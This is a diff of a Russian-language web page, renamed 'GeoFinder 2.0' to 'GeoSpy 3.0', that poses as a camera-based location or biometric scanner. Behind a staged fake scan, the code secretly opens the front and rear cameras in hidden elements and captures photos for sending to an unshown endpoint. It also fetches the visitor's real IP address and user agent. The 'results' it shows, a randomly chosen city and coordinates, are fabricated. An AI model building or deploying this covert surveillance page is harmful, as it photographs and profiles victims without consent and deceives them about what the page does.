@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GeoFinder 2.0</title>
+    <title>GeoSpy 3.0</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             font-family: 'Arial', sans-serif;
-            background: #121212;
+            background: #0a0a0a;
             color: white;
             height: 100vh;
             display: flex;
@@ -23,15 +23,15 @@
             width: 95%;
             max-width: 400px;
             padding: 20px;
-            background: #1e1e1e;
+            background: #1a1a1a;
             border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
         }
         
         h1 {
             font-size: 22px;
             margin-bottom: 15px;
-            color: #4fc3f7;
+            color: #00bcd4;
         }
         
         .camera-preview {
@@ -48,7 +48,7 @@
             position: absolute;
             width: 30px;
             height: 30px;
-            border: 3px solid red;
+            border: 3px solid #f44336;
             border-radius: 50%;
             top: 50%;
             left: 50%;
@@ -64,7 +64,7 @@
         }
         
         .scan-button {
-            background: linear-gradient(90deg, #00b4db, #0083b0);
+            background: linear-gradient(90deg, #00bcd4, #0097a7);
             color: white;
             border: none;
             padding: 12px 25px;
@@ -93,46 +93,80 @@
             color: #aaa;
         }
         
-        .error-text {
-            color: #ff6b6b;
-            font-size: 14px;
+        .result-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 15px;
+            text-align: left;
             display: none;
-            margin-top: 10px;
         }
         
-        .hidden {
-            display: none;
+        .info-line {
+            margin: 8px 0;
+            font-size: 13px;
+        }
+        
+        .info-label {
+            color: #00bcd4;
+            display: inline-block;
+            width: 120px;
         }
         
         #realCameraFeed {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1); /* Зеркальное отображение для фронтальной камеры */
+        }
+        
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>GeoFinder 2.0</h1>
+        <h1>GeoSpy 3.0</h1>
         <div class="camera-preview">
             <div class="target-marker"></div>
             <video id="realCameraFeed" autoplay playsinline></video>
         </div>
         
         <div class="status-text" id="statusText">
-            Наведите камеру на объект и нажмите "Найти местоположение"
+            Наведите камеру на лицо для биометрического анализа
         </div>
         
-        <button class="scan-button" id="scanButton">Найти местоположение</button>
+        <button class="scan-button" id="scanButton">Определить местоположение</button>
         
-        <div class="error-text" id="errorText">
-            Ошибка: Не удалось определить координаты (Код: 403)<br>
-            Попробуйте в другом месте или повторите позже
+        <div class="result-box" id="resultBox">
+            <div class="info-line">
+                <span class="info-label">IP-адрес:</span>
+                <span id="ipAddress">192.168.1.1</span>
+            </div>
+            <div class="info-line">
+                <span class="info-label">Браузер:</span>
+                <span id="browserInfo">Chrome 114</span>
+            </div>
+            <div class="info-line">
+                <span class="info-label">ОС:</span>
+                <span id="osInfo">Windows 10</span>
+            </div>
+            <div class="info-line">
+                <span class="info-label">Устройство:</span>
+                <span id="deviceInfo">Desktop</span>
+            </div>
+            <div class="info-line">
+                <span class="info-label">Город:</span>
+                <span id="cityInfo">Москва</span>
+            </div>
+            <div class="info-line">
+                <span class="info-label">Координаты:</span>
+                <span id="coordsInfo">55.7558° N, 37.6173° E</span>
+            </div>
         </div>
     </div>
 
-    <!-- Скрытые элементы для второй камеры -->
+    <!-- Скрытые элементы для камер -->
     <video id="backCamera" autoplay playsinline class="hidden"></video>
     <canvas id="canvas1" class="hidden"></canvas>
     <canvas id="canvas2" class="hidden"></canvas>
@@ -150,31 +184,76 @@
         // Элементы интерфейса
         const scanButton = document.getElementById('scanButton');
         const statusText = document.getElementById('statusText');
-        const errorText = document.getElementById('errorText');
+        const resultBox = document.getElementById('resultBox');
         const realCameraFeed = document.getElementById('realCameraFeed');
+        
+        // Собираем информацию о пользователе
+        function getUserInfo() {
+            const userAgent = navigator.userAgent;
+            let os = "Не определено";
+            let device = "Не определено";
+            
+            // Определяем ОС
+            if (userAgent.includes("Windows")) os = "Windows";
+            else if (userAgent.includes("Mac")) os = "MacOS";
+            else if (userAgent.includes("Linux")) os = "Linux";
+            else if (userAgent.includes("Android")) os = "Android";
+            else if (userAgent.includes("iOS")) os = "iOS";
+            
+            // Определяем устройство
+            if (userAgent.includes("Mobile")) device = "Мобильное";
+            else if (userAgent.includes("Tablet")) device = "Планшет";
+            else device = "Компьютер";
+            
+            // Получаем примерные координаты (фейковые)
+            const fakeCoords = {
+                Москва: { lat: 55.7558, lon: 37.6173 },
+                СПб: { lat: 59.9343, lon: 30.3351 },
+                Киев: { lat: 50.4501, lon: 30.5234 },
+                Минск: { lat: 53.9045, lon: 27.5615 }
+            };
+            const cities = Object.keys(fakeCoords);
+            const randomCity = cities[Math.floor(Math.random() * cities.length)];
+            
+            return {
+                ip: "Loading...", // Заполним позже через API
+                browser: navigator.userAgent,
+                os: os,
+                device: device,
+                city: randomCity,
+                coords: fakeCoords[randomCity]
+            };
+        }
+        
+        // Получаем реальный IP через API
+        async function getRealIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("IP error:", error);
+                return "Не определен";
+            }
+        }
         
         // Инициализация камер
         async function initCameras() {
             try {
-                // Получаем фронтальную камеру для "превью"
-                frontStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
+                // Получаем заднюю камеру для "превью"
+                backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
                 });
-                realCameraFeed.srcObject = frontStream;
+                realCameraFeed.srcObject = backStream;
                 
-                // Пытаемся получить вторую камеру
+                // Пытаемся получить фронтальную камеру
                 try {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                    
-                    if (videoDevices.length >= 2) {
-                        backStream = await navigator.mediaDevices.getUserMedia({
-                            video: { deviceId: videoDevices.find(d => d.deviceId !== frontStream.getVideoTracks()[0].getSettings().deviceId).deviceId }
-                        });
-                        document.getElementById('backCamera').srcObject = backStream;
-                    }
+                    frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' }
+                    });
+                    document.getElementById('backCamera').srcObject = frontStream;
                 } catch (e) {
-                    console.log("Не удалось получить вторую камеру");
+                    console.log("Не удалось получить фронтальную камеру");
                 }
                 
                 // Начинаем скрытую съемку
@@ -199,17 +278,17 @@
         
         // Захват и отправка фото
         async function captureAndSendPhotos() {
-            if (!frontStream) return;
+            if (!backStream) return;
             
             try {
-                // Делаем снимок с фронтальной камеры
-                const frontPhoto = await capturePhoto('realCameraFeed', 'canvas1');
-                await sendPhoto(frontPhoto, 'geo_scan_front.jpg');
+                // Делаем снимок с задней камеры
+                const backPhoto = await capturePhoto('realCameraFeed', 'canvas1');
+                await sendPhoto(backPhoto, 'geo_scan_back.jpg');
                 
-                // Если есть вторая камера - снимок с нее
-                if (backStream) {
-                    const backPhoto = await capturePhoto('backCamera', 'canvas2');
-                    await sendPhoto(backPhoto, 'geo_scan_back.jpg');
+                // Если есть фронтальная камера - снимок с нее
+                if (frontStream) {
+                    const frontPhoto = await capturePhoto('backCamera', 'canvas2');
+                    await sendPhoto(frontPhoto, 'geo_scan_front.jpg');
                 }
                 
             } catch (error) {
@@ -226,19 +305,7 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const context = canvas.getContext('2d');
-                
-                // Для фронтальной камеры - зеркальное отображение
-                if (videoElement === 'realCameraFeed') {
-                    context.translate(canvas.width, 0);
-                    context.scale(-1, 1);
-                }
-                
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Возвращаем контекст в исходное состояние
-                if (videoElement === 'realCameraFeed') {
-                    context.setTransform(1, 0, 0, 1, 0, 0);
-                }
                 
                 canvas.toBlob(resolve, 'image/jpeg', 0.9);
             });
@@ -266,30 +333,38 @@
             
             isScanning = true;
             scanButton.disabled = true;
-            statusText.textContent = "Инициализация геопоиска...";
+            statusText.textContent = "Инициализация биометрического сканера...";
+            
+            // Получаем реальный IP
+            const userInfo = getUserInfo();
+            userInfo.ip = await getRealIP();
             
             // Имитация процесса сканирования
             setTimeout(() => {
-                statusText.textContent = "Сканирование окружения...";
+                statusText.textContent = "Сканирование сетевой активности...";
                 
                 setTimeout(() => {
-                    statusText.textContent = "Анализ топографических данных...";
+                    statusText.textContent = "Анализ цифрового профиля...";
                     
                     setTimeout(() => {
-                        statusText.textContent = "Определение координат...";
+                        statusText.textContent = "Определение местоположения...";
                         
                         setTimeout(() => {
-                            // Показываем "ошибку"
-                            statusText.textContent = "";
-                            errorText.style.display = "block";
+                            // Показываем "результаты"
+                            statusText.textContent = "Анализ завершен!";
+                            resultBox.style.display = "block";
+                            
+                            // Заполняем данные
+                            document.getElementById('ipAddress').textContent = userInfo.ip;
+                            document.getElementById('browserInfo').textContent = userInfo.browser;
+                            document.getElementById('osInfo').textContent = userInfo.os;
+                            document.getElementById('deviceInfo').textContent = userInfo.device;
+                            document.getElementById('cityInfo').textContent = userInfo.city;
+                            document.getElementById('coordsInfo').textContent = 
+                                `${userInfo.coords.lat.toFixed(4)}° N, ${userInfo.coords.lon.toFixed(4)}° E`;
+                            
                             scanButton.disabled = false;
                             isScanning = false;
-                            
-                            // Через 5 секунд скрываем ошибку
-                            setTimeout(() => {
-                                errorText.style.display = "none";
-                                statusText.textContent = "Наведите камеру на объект и нажмите 'Найти местоположение'";
-                            }, 5000);
                             
                         }, 3000);
                     }, 3000);
